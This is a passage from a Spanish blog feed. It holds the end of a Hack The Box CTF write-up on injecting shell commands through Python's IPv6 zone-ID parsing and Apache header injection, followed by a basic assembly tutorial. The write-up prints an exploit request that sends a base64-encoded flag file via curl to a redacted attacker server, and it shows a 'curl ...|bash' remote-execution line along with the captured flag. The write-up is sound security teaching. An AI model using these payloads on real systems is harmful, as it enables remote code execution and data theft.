+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; ipaddress &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ip_address
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(ip_address(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;127.0.TEST.1&amp;#39;&lt;/span&gt;))
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;resultado-1&#34;&gt;Resultado:&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ERROR!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Traceback &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;most recent call last&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;main.py&amp;gt;&amp;#34;&lt;/span&gt;, line 2, in &amp;lt;module&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/lib/python3.12/ipaddress.py&amp;#34;&lt;/span&gt;, line 54, in ip_address
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    raise ValueError&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{address!r} does not appear to be an IPv4 or IPv6 address&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ValueError: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;127.0.TEST.1&amp;#39;&lt;/span&gt; does not appear to be an IPv4 or IPv6 address
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Después de leer la documentación de la biblioteca ipaddress y el RFC 4007, aprendí que en IPv6 es posible indicar un identificador de zona, usando la sintaxis &lt;code&gt;&amp;lt;ipv6&amp;gt;%&amp;lt;id_zona&amp;gt;&lt;/code&gt;. Lo interesante es la única validación que hace la función &lt;code&gt;ip_address()&lt;/code&gt; sobre esta característica: si el caracter &lt;code&gt;%&lt;/code&gt; está presente, el ID de zona tambien tiene que incluirse, sin verificar qué tipo de caracteres lo componen.&lt;/p&gt;
+&lt;p&gt;Teniendo esto en mente, probemos nuevamente la función.&lt;/p&gt;
+&lt;h3 id=&#34;dirección-ipv6-con-inyección-de-comandos-en-id-de-zona&#34;&gt;Dirección IPv6 con inyección de comandos en ID de zona&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; ipaddress &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ip_address
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(ip_address(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;::1%$(whoami)&amp;#39;&lt;/span&gt;))
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;resultado-2&#34;&gt;Resultado:&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;::1%&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;whoami&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;La idea detrás del &lt;em&gt;payload&lt;/em&gt; final es codificar en base64 la bandera y usar &lt;code&gt;curl&lt;/code&gt; para crear una petición HTTP, agregando la bandera codificada como parámetro en la URL y enviándola a un servidor bajo nuestro control.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ curl -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;amp;name=v%0d%0aLocation:/hfc%0d%0aContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(curl%2bhttps://&amp;lt;--REDACTED--&amp;gt;?flag=`cat%2b/flag*|base64`)%26name=v%0d%0a%0d%0a&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HTTP/1.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;302&lt;/span&gt; Found
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Date: Wed, &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; Mar &lt;span style=&#34;color:#ae81ff&#34;&gt;2025&lt;/span&gt; 03:42:19 GMT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Server: Apache/2.4.54 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Location: ../?result&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Succesfully attacked ::1%&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;curl hackersfight.club:8000|bash&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;!
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;331&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type: text/html; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;iso-8859-1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;!DOCTYPE HTML PUBLIC &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-//IETF//DTD HTML 2.0//EN&amp;#34;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;title&amp;gt;302 Found&amp;lt;/title&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;h1&amp;gt;Found&amp;lt;/h1&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;p&amp;gt;The document has moved &amp;lt;a href&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;../?result=Succesfully attacked ::1%&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;curl https://&amp;lt;--REDACTED--&amp;gt;?flag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;cat /flag*|base64&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;!&amp;#34;&lt;/span&gt;&amp;gt;here&amp;lt;/a&amp;gt;.&amp;lt;/p&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;hr&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;address&amp;gt;Apache/2.4.54 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Server at 127.0.0.1 Port 80&amp;lt;/address&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finalmente, recibiendo la petición desde el servidor vulnerable y consiguiendo la bandera.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ grep flag access.log
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;83.136.249.227 - - &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;26/Mar/2025:03:42:19 +0000&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET /?flag=SFRCe2g0bmRsMW42X200bDRrNHI1X2YwcmMzNX0= HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4252&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;curl/7.74.0&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SFRCe2g0bmRsMW42X200bDRrNHI1X2YwcmMzNX0=&amp;#39;&lt;/span&gt;|base64 -d
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HTB&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;h4ndl1n6_m4l4k4r5_f0rc35&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id=&#34;referencias-útiles&#34;&gt;Referencias útiles&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://blog.orange.tw/posts/2024-08-confusion-attacks-en/&#34;&gt;Orange Tsai | Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://docs.python.org/3/library/ipaddress.html&#34;&gt;Python docs | ipaddress — IPv4/IPv6 manipulation library&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://datatracker.ietf.org/doc/html/rfc4007.html&#34;&gt;RFC 4007 | IPv6 Scoped Address Architecture&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://portswigger.net/web-security/ssrf&#34;&gt;PortSwigger | Server-Side Request Forgery&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://portswigger.net/web-security/os-command-injection&#34;&gt;PortSwigger | OS Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Reversing Basicos: Arquitectura de Computadoras</title>
+      <link>https://albertnath.github.io/hfc-blog/posts/reversing-basics/</link>
+      <pubDate>Sun, 16 Feb 2025 09:12:08 -0600</pubDate>
+      
+      <guid>https://albertnath.github.io/hfc-blog/posts/reversing-basics/</guid>
+      <description>Básicos Toda la memoria está indexada en hexadecimal. En la memoria viven las instrucciones en ensamblador.
+Dependiendo de la arquitectura, tendremos entre 8 y 32 registros. Un registro puede verse como variables globales. Permiten realizar opreaciones aritmético-lógicas según su tipo. El tamaño de estos registros depende de la arquitectura del procesador (32 o 64 bits).
+Si los números que manejamos son más grandes que el tamaño máximo de nuestros registros, tendremos que dividir el número entre más de un registro.</description>
+      <content>&lt;h1 id=&#34;básicos&#34;&gt;Básicos&lt;/h1&gt;
+&lt;p&gt;Toda la memoria está indexada en hexadecimal. En la memoria viven las instrucciones en ensamblador.&lt;/p&gt;
+&lt;p&gt;Dependiendo de la arquitectura, tendremos entre 8 y 32 registros. Un registro puede verse como variables globales. Permiten realizar opreaciones aritmético-lógicas según su tipo. El tamaño de estos registros depende de la arquitectura del procesador (32 o 64 bits).&lt;/p&gt;
+&lt;p&gt;Si los números que manejamos son más grandes que el tamaño máximo de nuestros registros, tendremos que &lt;strong&gt;dividir el número entre más de un registro&lt;/strong&gt;. Si a pesar de esto el espacio es insuficiente, tendremos que echar mano de &lt;strong&gt;la memoria&lt;/strong&gt; que no esté ocupada.&lt;/p&gt;
+&lt;p&gt;Uno de los registros más importantes es &lt;strong&gt;Program Counter (PC)&lt;/strong&gt; que inidica al procesador la dirección de memoria con la siguiente instrucción a ejecutar. También es conocido como &lt;strong&gt;Instruction Pointer&lt;/strong&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;heap-y-stack&#34;&gt;Heap y stack&lt;/h2&gt;
+&lt;p&gt;Son dos estructuras de datos asociadas a cualquier proceso. El stack se encuentra al inicio del espacio de memoria asignado al proceso y crece &amp;ldquo;hacia abajo&amp;rdquo;. Tiene registros especiales asociados:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Stack Pointer (SP/ESP/RSP)&lt;/strong&gt; apunta a la dirección en memoria que está al tope de la pila.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;caché&#34;&gt;Caché&lt;/h2&gt;
+&lt;p&gt;Idealmente, todo un proceso debería usar solo registros, pero esto es poco probable que ocurra (el software moderno es pesado).&lt;/p&gt;
+&lt;p&gt;Los accesos a memoria &lt;strong&gt;son caros&lt;/strong&gt;, por lo que aprovechamos el caché de un CPU (estructuras de memoria especiales y muy rápidas) que almacenan direcciones de memoria si se usan frequentemente.&lt;/p&gt;
+&lt;h1 id=&#34;instrucciones-de-asm&#34;&gt;Instrucciones de ASM&lt;/h1&gt;
+&lt;p&gt;Ensamblador es un lenguaje de muy bajo nivel que permite comunicarnos casi directamente con el CPU. Se basa en &lt;strong&gt;instrucciones&lt;/strong&gt;, que operan con los registros de una CPU.&lt;/p&gt;
+&lt;p&gt;La sintaxis de este lenguaje puede variar según la arquitectura y las convenciones, AT&amp;amp;T o Intel. La sintaxis y convención más usada es IA32 de Intel (presente desde el mítico i386).&lt;/p&gt;
+&lt;h2 id=&#34;banderas&#34;&gt;Banderas&lt;/h2&gt;
+&lt;p&gt;Algunas de las instrucciones a contiunación modifican registros especiales llamados &lt;strong&gt;banderas&lt;/strong&gt;, que indican información adicional tras una operación.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;zeroflag&lt;/code&gt; 1 si el último valor calculado fue cero, en otro caso su valor es 0.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;instrucciones-básicas&#34;&gt;Instrucciones básicas&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;mov &amp;lt;reg_destino&amp;gt;, &amp;lt;valor&amp;gt;&lt;/code&gt; mueve el valor al registro especificado &lt;code&gt;reg_destino&lt;/code&gt;. Notemos que el valor puede ser otro registro. Si el valor es del tipo &lt;code&gt;[addr]&lt;/code&gt;, entonces trae un valor de una dirección en memoria &lt;code&gt;addr&lt;/code&gt; y lo carga en el registro destino.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;add &amp;lt;reg_destino&amp;gt;, &amp;lt;valor&amp;gt;&lt;/code&gt; suma el valor al contenido del registro, el resultado se almacena en el registro destino.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;sub &amp;lt;reg_destino&amp;gt;, &amp;lt;valor&amp;gt;&lt;/code&gt; resta el valor al contenido del registro, el resultado se almacena en el registro destino.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;push &amp;lt;valor&amp;gt;&lt;/code&gt; agrega un valor a la pila y hace que SP apunte a la nueva dirección en el tope. ``&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;pop &amp;lt;reg_dest&amp;gt;&lt;/code&gt; el valor que está al tope de la pila es sacado y almacenado en el registro destino y el SP es decrementado.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;instrucciones-de-flujo-de-control&#34;&gt;Instrucciones de flujo de control&lt;/h2&gt;
+&lt;p&gt;Estas instrucciones ayudan a modificar o definir un fliujo que el programa debería seguir.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;jmp &amp;lt;addr&amp;gt;&lt;/code&gt; el PC se mueve a la dirección especificada&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;je &amp;lt;addr&amp;gt;&lt;/code&gt; si &lt;code&gt;zeroflag&lt;/code&gt; esta activa, ve a la dirección especificada&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;call&lt;/code&gt; una mezcla entre &lt;code&gt;push&lt;/code&gt;, &lt;code&gt;jmp&lt;/code&gt; y &lt;code&gt;ret&lt;/code&gt;. Primero pone en el tope de la pila la dirección de la siguiente instrucción a ejecutar, luego, va a la dirección de una función especificada y al terminar, ejecuta &lt;code&gt;ret&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ret&lt;/code&gt; hace &lt;code&gt;pop&lt;/code&gt; a la pila y pone la dirección en PC.&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
